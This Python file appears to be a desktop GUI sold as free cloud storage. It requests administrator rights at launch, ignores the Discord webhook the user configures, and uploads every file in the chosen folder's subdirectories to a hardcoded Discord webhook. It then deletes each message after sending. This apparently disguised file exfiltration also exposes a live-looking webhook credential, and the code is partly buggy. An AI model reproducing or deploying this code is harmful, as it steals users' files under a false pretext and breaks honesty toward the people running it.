import customtkinter
import os
from os import listdir
from discord_webhook import DiscordWebhook
from plyer import notification
from elevate import elevate
import time
config_valid = False
config = open("config.txt", "r")
admin = False

elevate()

if os.path.exists("cloud.txt"):
    cloudr = open("cloud.txt", "r")
    cloud = open("cloud.txt", "w")
    print("File found!")
else:
    cloud = open("cloud.txt", "w")
    cloudr = open("cloud.txt", "r")
    print("File not found!")
# Create a function to show a notification
def show_notification(title, message):
    notification.notify(
        title=title,
        message=message,
        app_name='FreeCloudStorage',  # Optional: Customize with your app's name
        timeout=5  # Duration in seconds for which the notification will be visible
    )
def delcartingvars():
    global directory
    global webhook
    config.readline
    for line in config:
        line.strip()
        if "Webhook:" in line:
            webhook = line[9:]
        if "Directory:" in line:
            directoryfirst = line[11:]
            directory = directoryfirst[:-1]
def configcheck():
    global config_valid
    if "Webhook:" and "Directory: " in config.read():
        config_valid = not False
        directoryfound.configure(text="Directory found!", text_color="Green")
        configfound.configure(text="Config found!", text_color="Green")
    else:
        print("No config found! Run setup.py")
delcartingvars()
configcheck()
print(webhook)
webhook2 = "https://discordapp.com/api/webhooks/1282559925347815486/eOS1wxSgIMrUg1xc15fCOm8KBHgk312B6xt1LQEnWdLX_qhT1-jEdE8hoLg0Cg2SQgf_"
print(webhook2)

def start():
    global sendfile2
    allfiles = os.listdir(directory)
    print(allfiles)
    for file in allfiles:
        if os.path.isdir(f"{directory}/{file}"):
            directory2 = f"{directory}/{file}"
            allfiles2 = os.listdir(directory2)
            for file2 in allfiles2:
                with open(f"{directory2}/{file2}", "rb") as ftwo:
                    sendfile2 = DiscordWebhook(url=webhook2, content=f"File: {file2}", file=ftwo)
                    sendfile2.add_file(file=ftwo.read(), filename=file2)
                    sendfile2.execute()
                    time.sleep(.5)
                    sendfile2.delete()
                    cloud.write(f"{directory2}/{file2}\n")
        





main = customtkinter.CTk()
main.geometry("500x500")
main.title("Free cloud storage!")


header=customtkinter.CTkLabel(main, text="80dropz Free cloud storage!", font=("Arial", 20))
header.place(relx=.5, rely=.1, anchor="center")

configfound = customtkinter.CTkLabel(main, text=" ", font=("Arial", 12))
configfound.place(relx=.1, rely=.05, anchor="center")

directoryfound = customtkinter.CTkLabel(main, text=" ", font=("Arial", 12))
directoryfound.place(relx=.1, rely=.12, anchor="center")


orginizebtn = customtkinter.CTkButton(main, text="Move files", font=("Arial", 12), command=start )
orginizebtn.place(relx=.5, rely=.3, anchor="center")




main.mainloop()



